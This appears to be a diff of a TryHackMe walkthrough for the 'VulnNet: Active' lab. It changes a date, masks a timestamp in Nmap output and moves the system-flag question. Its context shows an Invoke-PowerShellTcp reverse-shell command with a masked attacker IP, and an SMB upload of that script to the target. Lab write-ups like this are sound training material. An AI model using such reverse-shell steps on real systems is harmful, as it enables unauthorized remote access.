@@ -1,5 +1,5 @@
 <h1 align="center">VulnNet: Active</h1>
-<p align="center">2025, August 23<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>474</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
+<p align="center">2025, September 7<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>474</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
 <em>VulnNet Entertainment just moved their entire infrastructure... Check this out...</em><br>
 <img width="80px" src="https://github.com/user-attachments/assets/183b30b9-5b5a-425b-83ba-d289f3914547"><br>
 Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/vulnnetactive">here </a>.<br>
@@ -19,10 +19,8 @@ Icon made by <a href="https://www.freepik.com/">Freepik</a> from <a href="http:/
 
 <p><em>Answer the questions below</em></p>
 
-<p>1.2. What is the system flag? (Desktop\system.txt)<br>
-<code>________</code></p>
-
 <br>
+
 
 <h2>Nmap</h2>
 <p> 14 open ports:
@@ -83,7 +81,7 @@ Host script results:
 |   2.02: 
 |_    Message signing enabled and required
 | smb2-time: 
-|   date: 2025-08-23Txx:xx:xx
+|   date: 2025-xx-xxTxx:xx:xx
 |_  start_date: N/A
 ```
 
@@ -402,6 +400,11 @@ Invoke-PowerShellTcp -Reverse -IPAddress xx.xxxx.xx.xx -Port xxxx
 smb: \> put Invoke-PowerShellTcp.ps1
 
 ```
+
+
+
+<p>1.2. What is the system flag? (Desktop\system.txt)<br>
+<code>________</code></p>
 
 
 
